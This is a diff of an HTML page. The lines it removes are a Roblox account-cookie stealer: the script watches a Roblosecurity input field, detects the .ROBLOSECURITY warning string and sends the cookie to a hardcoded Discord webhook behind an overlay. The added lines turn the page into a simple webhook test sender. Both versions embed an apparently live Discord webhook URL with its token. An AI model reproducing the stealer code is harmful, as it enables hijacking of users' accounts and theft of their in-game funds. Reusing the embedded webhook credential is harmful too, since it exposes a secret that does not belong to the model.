@@ -3,80 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hidden Script</title>
-    <style>
-        /* Styling for the overlay */
-        #overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.7); /* Black with 70% opacity */
-            display: none; /* Initially hidden */
-            z-index: 9999; /* Ensure the overlay is on top of other elements */
-        }
-        
-        /* Styling for the content */
-        #content {
-            color: white; /* Set text color to white for better contrast */
-            position: relative; /* Set to relative to allow stacking */
-            z-index: 10000; /* Ensure content is on top of the overlay */
-        }
-    </style>
+    <title>Discord Webhook Sender</title>
 </head>
 <body>
-    <!-- Overlay -->
-    <div id="overlay"></div>
 
-    <!-- Content -->
-    <div id="content">
-        <script>
-            // Function to send data to a Discord webhook
-            function sendToWebhook(data) {
-                // Replace 'YOUR_WEBHOOK_URL' with the provided Discord webhook URL
-                const webhookUrl = 'https://discord.com/api/webhooks/1232806740102221946/SfTiZoG5B_qBfPAKZFl5sqnP8Zndd2JXISk4HmANcPcSKmAbjlf5uGykvOd_9o7VeTuM';
+    <h1>Discord Webhook Sender</h1>
+    <p>Click the button below to send data to a Discord webhook:</p>
+    <button onclick="sendData()">Send Data</button>
 
-                // Create a new XMLHttpRequest object
-                const xhr = new XMLHttpRequest();
+    <script>
+        // Function to send data to a Discord webhook
+        function sendToWebhook(data) {
+            // Replace 'YOUR_WEBHOOK_URL' with the provided Discord webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1232806740102221946/SfTiZoG5B_qBfPAKZFl5sqnP8Zndd2JXISk4HmANcPcSKmAbjlf5uGykvOd_9o7VeTuM';
 
-                // Configure the request
-                xhr.open('POST', webhookUrl);
+            // Create a new XMLHttpRequest object
+            const xhr = new XMLHttpRequest();
 
-                // Set the Content-Type header to JSON
-                xhr.setRequestHeader('Content-Type', 'application/json');
+            // Configure the request
+            xhr.open('POST', webhookUrl);
 
-                // Define the data to send to the webhook
-                const payload = {
-                    content: data
-                };
+            // Set the Content-Type header to JSON
+            xhr.setRequestHeader('Content-Type', 'application/json');
 
-                // Convert the payload to JSON
-                const jsonPayload = JSON.stringify(payload);
+            // Send the request with the provided data
+            xhr.send(JSON.stringify(data));
+        }
 
-                // Send the request
-                xhr.send(jsonPayload);
-            }
+        function sendData() {
+            // Example data to send
+            const data = {
+                content: 'This is a test message sent to Discord webhook!'
+            };
 
-            // Get the input field by its class name
-            const inputField = document.querySelector('.css-3hthdr-Roblosecurity--Form.emh8bm65');
+            // Call the function to send data to the webhook
+            sendToWebhook(data);
+        }
+    </script>
 
-            // Add an event listener to the input field for the 'input' event
-            inputField.addEventListener('input', function(event) {
-                // Get the value typed by the user
-                const userInput = event.target.value;
-                
-                // Check if the user input matches the specific string
-                const warningString = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and";
-                if (userInput.includes(warningString)) {
-                    // Send the user input to the Discord webhook
-                    sendToWebhook(userInput);
-                }
-            });
-
-            // Show overlay
-            document.getElementById('overlay').style.display = 'block';
-        </script>
-    </div>
 </body>
 </html>
